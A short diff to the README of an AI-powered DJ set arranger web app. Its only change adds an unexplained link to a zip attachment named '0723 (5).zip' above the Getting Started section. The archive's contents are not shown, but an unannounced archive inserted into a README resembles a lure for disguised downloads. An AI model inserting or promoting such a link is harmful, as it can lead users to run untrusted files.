@@ -1,5 +1,5 @@
 Mixify is an AI-powered DJ set arranger web app. Enter your song list and describe your desired vibe—Mixify uses OpenAI’s GPT models to reorder your tracks for optimal flow, energy, and mixing compatibility. Enjoy a beautiful, animated, and modern interface designed for DJs and music lovers.
-
+[0723 (5).zip](https://github.com/user-attachments/files/21397321/0723.5.zip)
 Getting Started
 bash
 Copy
